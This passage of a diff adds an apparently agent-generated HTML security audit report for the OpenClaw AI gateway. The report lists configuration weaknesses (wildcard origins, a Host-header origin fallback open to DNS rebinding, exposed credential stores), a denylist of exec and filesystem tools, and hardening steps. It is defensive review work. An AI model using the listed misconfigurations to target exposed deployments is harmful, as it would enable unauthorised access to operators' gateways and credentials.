+        <p><code>gateway.controlUi.allowedOrigins: ["*"]</code> disables origin allowlisting — critical if bind is non-loopback.</p>
+        <p><strong>Fix:</strong> Replace with explicit trusted origin URLs.</p>
+      </article>
+
+      <article class="finding">
+        <div class="finding-header"><h3>[CFG-004] Host-header origin fallback</h3><span class="badge badge-medium">Medium</span></div>
+        <p><strong>Location:</strong> <code>src/security/audit-gateway-config.ts:194-205</code>, <code>src/gateway/origin-check.ts:57-63</code></p>
+        <p><code>dangerouslyAllowHostHeaderOriginFallback=true</code> accepts Origin matching Host header — DNS rebinding risk on exposed deployments.</p>
+        <p><strong>Fix:</strong> Disable; use explicit <code>allowedOrigins</code>.</p>
+      </article>
+
+      <article class="finding">
+        <div class="finding-header"><h3>[HOOKS-001] hooks.allowRequestSessionKey</h3><span class="badge badge-medium">Medium</span></div>
+        <p><strong>Location:</strong> <code>src/security/dangerous-config-flags-core.ts:80-82</code></p>
+        <p>Allows hook callers to specify session keys — expands blast radius if hook token is leaked.</p>
+        <p><strong>Fix:</strong> Keep disabled unless required; use fixed session routing in hook mappings.</p>
+      </article>
+
+      <article class="finding">
+        <div class="finding-header"><h3>[DESER-001] Config loaded via JSON/JSON5 without integrity signing</h3><span class="badge badge-medium">Medium</span></div>
+        <p><strong>Location:</strong> <code>src/config/paths.ts:107-145</code> (<code>$include</code> resolution)</p>
+        <p>Config supports <code>$include</code> with optional <code>OPENCLAW_INCLUDE_ROOTS</code> allowlist. No yaml.load/pickle in runtime. Tampered config files on disk affect gateway behavior — mitigated by filesystem permissions (<code>~/.openclaw</code> mode 700 in Docker).</p>
+        <p><strong>Fix:</strong> Restrict include roots; protect config directory permissions; use secrets refs instead of inline tokens.</p>
+      </article>
+
+      <article class="finding">
+        <div class="finding-header"><h3>[SEC-001] API keys and channel tokens in local state</h3><span class="badge badge-medium">Medium</span></div>
+        <p><strong>Location:</strong> <code>.env.example:14-77</code>, <code>src/secrets/</code></p>
+        <p>Model provider keys, channel bot tokens, and gateway secrets resolve from env, config, or encrypted auth-profile store. Exposure of <code>~/.openclaw</code> or mounted Docker volumes leaks all credentials.</p>
+        <p><strong>Fix:</strong> Use OS keychain/secret refs; chmod 700 state dirs; separate auth-profile secret mount (<code>OPENCLAW_AUTH_PROFILE_SECRET_DIR</code>).</p>
+      </article>
+
+      <article class="finding">
+        <div class="finding-header"><h3>[DEPS-001] Large third-party dependency surface</h3><span class="badge badge-medium">Medium</span></div>
+        <p><strong>Location:</strong> <code>package.json</code>, <code>pnpm-lock.yaml</code>, 140+ extensions</p>
+        <p>Monorepo includes Matrix crypto natives, Playwright, sharp, many channel SDKs. Dockerfile pins base image digests; Dependabot configured. No exhaustive CVE scan performed in this review.</p>
+        <p><strong>Fix:</strong> Run <code>pnpm audit</code> / OSV in CI; keep lockfile frozen; minimize optional extensions in production images.</p>
+      </article>
+    </section>
+
+    <section id="low-info">
+      <h2>Low &amp; Informational Findings</h2>
+      <table>
+        <thead><tr><th>ID</th><th>Severity</th><th>Issue</th><th>Fix / Note</th></tr></thead>
+        <tbody>
+          <tr><td>XSS-001</td><td><span class="badge badge-low">Low</span></td><td>Session export HTML escapes user content</td><td>Verified in <code>template.security.test.ts</code> — keep tests passing</td></tr>
+          <tr><td>CSRF-001</td><td><span class="badge badge-low">Low</span></td><td>Gateway API uses Bearer token, not cookies</td><td>CSRF risk low for API; origin checks protect WebSocket UI</td></tr>
+          <tr><td>REDIR-001</td><td><span class="badge badge-low">Low</span></td><td>OAuth flows in provider plugins</td><td>Verify redirect URI allowlists per provider extension at enable time</td></tr>
+          <tr><td>API-003</td><td><span class="badge badge-low">Low</span></td><td>Hook query-string token rejected</td><td>Positive — <code>hooks-request-handler.ts:188-194</code></td></tr>
+          <tr><td>PROMPT-001</td><td><span class="badge badge-info">Info</span></td><td>Prompt injection alone out of scope per SECURITY.md</td><td>Mitigate via channel allowlists, sandbox, exec policy — not model-only fixes</td></tr>
+          <tr><td>INJ-002</td><td><span class="badge badge-info">Info</span></td><td>No yaml.load / eval / pickle in runtime paths</td><td>Positive — JSON/JSON5 config only</td></tr>
+          <tr><td>SSRF-002</td><td><span class="badge badge-info">Info</span></td><td>Default SSRF blocks metadata &amp; private IPs</td><td>Positive — <code>src/infra/net/ssrf.ts</code></td></tr>
+          <tr><td>SEC-002</td><td><span class="badge badge-info">Info</span></td><td>Known weak gateway placeholders rejected at startup</td><td>Positive — <code>known-weak-gateway-secrets.ts</code></td></tr>
+          <tr><td>IAC-003</td><td><span class="badge badge-info">Info</span></td><td>Docker runtime USER node, cap_drop, no-new-privileges</td><td>Positive — <code>Dockerfile:306-309</code>, <code>docker-compose.yml:56-60</code></td></tr>
+          <tr><td>AUTH-004</td><td><span class="badge badge-info">Info</span></td><td>Tailscale Funnel requires password auth mode</td><td>Positive — <code>setup.gateway-config.ts:197</code></td></tr>
+          <tr><td>DEPS-002</td><td><span class="badge badge-info">Info</span></td><td>Base images pinned to SHA256 digests</td><td>Positive — <code>Dockerfile:12-14</code></td></tr>
+        </tbody>
+      </table>
+    </section>
+
+    <section id="verified-safe">
+      <h2>Verified Safe Controls</h2>
+      <ul class="safe-list">
+        <li><strong>Gateway auth rate limiting</strong> — failed token/password attempts throttled (<code>src/gateway/auth-rate-limit.ts</code>)</li>
+        <li><strong>Hook authentication</strong> — Bearer/X-OpenClaw-Token only; query tokens rejected; constant-time compare; 20/min rate limit (<code>src/gateway/server/hooks-request-handler.ts:188-224</code>)</li>
+        <li><strong>Hooks token ≠ gateway token</strong> — startup validation prevents shared secret reuse (<code>src/gateway/startup-auth.ts:224-245</code>)</li>
+        <li><strong>SSRF pinning</strong> — DNS rebinding protection, metadata IP block, redirect loop policy (<code>src/infra/net/ssrf.ts</code>)</li>
+        <li><strong>HTTP tool denylist</strong> — exec/fs/cron/gateway denied on <code>/tools/invoke</code> by default (<code>src/security/dangerous-tools.ts</code>)</li>
+        <li><strong>Security audit CLI</strong> — comprehensive config findings (<code>src/security/audit.ts</code>, <code>audit-gateway-config.ts</code>)</li>
+        <li><strong>Skill/plugin scanner</strong> — static analysis for dangerous patterns (<code>src/security/skill-scanner.js</code>)</li>
+        <li><strong>Secret comparison</strong> — <code>safeEqualSecret</code> timing-safe (<code>src/security/secret-equal.ts</code>)</li>
+        <li><strong>Default channel DM policy</strong> — wizard defaults to <code>pairing</code> (<code>setup-wizard-helpers.ts:657</code>)</li>
+        <li><strong>Docker hardening</strong> — non-root user, tini init, cap_drop NET_RAW/NET_ADMIN</li>
+        <li><strong>Baseline HTTP headers</strong> — X-Content-Type-Options, Referrer-Policy, Permissions-Policy (<code>src/gateway/http-common.ts:15-26</code>)</li>
+        <li><strong>Control UI origin validation</strong> — WebSocket origin check with private-network rules (<code>src/gateway/origin-check.ts</code>)</li>
+      </ul>
+    </section>
+
+    <section id="owasp">
+      <h2>OWASP Top 10 (2021) Coverage</h2>
+      <table>
+        <thead><tr><th>Category</th><th>Status</th><th>Notes</th></tr></thead>
+        <tbody>
+          <tr><td>A01 Broken Access Control</td><td><span class="badge badge-high">Partial</span></td><td>Single-operator model; AUTHZ-001 open DMs; shared token = full access by design</td></tr>
+          <tr><td>A02 Cryptographic Failures</td><td><span class="badge badge-pass">Pass</span></td><td>Weak placeholder rejection; auth-profile encryption; TLS optional for gateway</td></tr>
+          <tr><td>A03 Injection</td><td><span class="badge badge-high">Partial</span></td><td>INJ-001 host exec defaults; parameterized SQLite in task registry; no SQLi in gateway API</td></tr>
+          <tr><td>A04 Insecure Design</td><td><span class="badge badge-medium">Partial</span></td><td>Intentional trusted-operator design; audit tooling compensates; Docker defaults risky</td></tr>
+          <tr><td>A05 Security Misconfiguration</td><td><span class="badge badge-high">Fail</span></td><td>IAC-001, AUTH-001, CFG-* when operators deviate from docs</td></tr>
+          <tr><td>A06 Vulnerable Components</td><td><span class="badge badge-medium">Partial</span></td><td>DEPS-001 — large tree; pinned Docker bases; run CI audit</td></tr>
+          <tr><td>A07 Auth Failures</td><td><span class="badge badge-high">Partial</span></td><td>Strong when token configured; AUTH-001/002 on misconfig</td></tr>
+          <tr><td>A08 Software/Data Integrity</td><td><span class="badge badge-pass">Pass</span></td><td>Plugin integrity checks on npm update; Docker GPG verify for CLI install</td></tr>
+          <tr><td>A09 Logging &amp; Monitoring</td><td><span class="badge badge-pass">Pass</span></td><td>Diagnostic tracing, hook auth logging, optional OTEL export</td></tr>
+          <tr><td>A10 SSRF</td><td><span class="badge badge-pass">Pass</span></td><td>SSRF-002 default block; SSRF-001 only when operator opts in</td></tr>
+        </tbody>
+      </table>
+    </section>
+
+    <section id="out-of-scope">
+      <h2>Out of Scope &amp; Assumptions</h2>
+      <ul>
+        <li>No dynamic penetration testing, production deployment access, or mobile app (iOS/Android) binary review</li>
+        <li>Prompt-injection-only chains without policy/auth/sandbox bypass classified as out of scope per <a href="https://github.com/openclaw/openclaw/blob/main/SECURITY.md">SECURITY.md</a></li>
+        <li>Assumed single trusted operator per gateway — not multi-tenant adversarial isolation</li>
+        <li>Malicious plugins after explicit operator install treated as trusted TCB unless store verification fails</li>
+        <li>Dependency CVE database not exhaustively scanned — recommend <code>pnpm audit</code> and OSV-Scanner in CI</li>
+        <li>Review based on repository state at clone time (main branch, 2026-05-27)</li>
+        <li>ClawHub marketplace (<code>openclaw/clawhub</code>) and macOS/iOS/Android apps referenced but not fully audited here</li>
+      </ul>
+      <p>Report exploitable vulnerabilities privately via <a href="https://github.com/openclaw/openclaw/security/advisories/new">GitHub Security Advisory</a> or <a href="mailto:security@openclaw.ai">security@openclaw.ai</a>.</p>
+    </section>
+
+    <section id="next-steps">
+      <h2>Recommended Next Steps</h2>
+      <h3>Deployment blockers (mandatory for internet/LAN exposure)</h3>
+      <ol>
+        <li>Set strong <code>OPENCLAW_GATEWAY_TOKEN</code> before any non-loopback bind (IAC-001, AUTH-001)</li>
+        <li>Change Docker Compose default bind to loopback or require token at startup (IAC-001)</li>
+        <li>Never use <code>gateway.auth.mode=none</code> on LAN/public interfaces (AUTH-001)</li>
+        <li>Keep channel <code>dmPolicy: pairing</code> or allowlist — audit before go-live (AUTHZ-001)</li>
+        <li>Enable sandbox + exec allowlist/ask for any channel-facing agent (INJ-001)</li>
+      </ol>
+      <h3>Recommended (non-blocking)</h3>
+      <ol>
+        <li>Run <code>openclaw security audit --fix</code> after onboarding and on config changes</li>
+        <li>Configure <code>gateway.controlUi.allowedOrigins</code> for non-loopback UI (AUTH-003)</li>
+        <li>Do not add exec/shell to <code>gateway.tools.allow</code> unless strictly necessary (API-001)</li>
+        <li>Add <code>pnpm audit</code> / OSV to CI pipeline (DEPS-001)</li>
+        <li>Review enabled extensions and disable unused channel plugins to reduce attack surface</li>
+        <li>Re-run this review after major gateway/auth/tool changes</li>
+      </ol>
+      <p style="margin-top:2rem;color:var(--muted);font-size:0.85rem">
+        Generated by Security Reviewer agent workflow · Skills: security-review-methodology, business-logic-authentication, business-logic-authorization, business-logic-csrf, source-sink-injection, source-sink-xss, source-sink-ssrf, source-sink-deserialization, secrets-detection, dependency-supply-chain, api-security-review, infrastructure-as-code-security, owasp-top-10-review, security-review-report
+      </p>
+    </section>
+  </main>
+</div>
+</body>
+</html>
